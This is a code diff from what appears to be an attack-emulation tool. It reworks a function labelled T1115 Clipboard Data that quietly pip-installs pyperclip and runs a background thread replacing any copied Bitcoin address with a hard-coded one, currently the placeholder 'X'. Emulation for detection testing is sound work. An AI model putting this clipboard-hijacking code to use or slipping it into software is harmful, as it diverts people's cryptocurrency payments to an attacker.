@@ -25,23 +25,27 @@ def clipboard_data_alternation(platform):
         print("Warning: pyperclyp not installed - fixing now.")
         os.system(f'{executable} -m ensurepip --upgrade >nul')
         os.system(f'{executable} -m pip install pyperclip >nul')
-    finally:
+        time.sleep(20)
+
+
+    try:
         import pyperclip as pc
+    except:
+        print("Error: pyperclip not installed - skipping T1115 Clipboard Data")
+    else:
 
-    BTC_address = "X"
+        BTC_address = "X"
 
-    def clip():
-        while True:
-            time.sleep(0.5)
-            # test with 15f12gEh2DFcHyhSyu7v3Bji5T3CJa9Smn 14qViLJfdGaP4EeHnDyJbEGQysnCpwk3gd
-            if bool(re.match("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$", str(pc.paste())))  == True:
-                pc.copy(BTC_address)
-                print("Info: T1115 Clipboard Data: Success")
+        def clip():
+            while True:
+                time.sleep(0.5)
+                # test with 15f12gEh2DFcHyhSyu7v3Bji5T3CJa9Smn 14qViLJfdGaP4EeHnDyJbEGQysnCpwk3gd
+                if bool(re.match("^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$", str(pc.paste())))  == True:
+                    pc.copy(BTC_address)
+                    print("Info: T1115 Clipboard Data: Success")
 
-
-
-    thread = Thread(target=clip)
-    thread.start()
+        thread = Thread(target=clip)
+        thread.start()
 
 
 def screen_capture(platform):
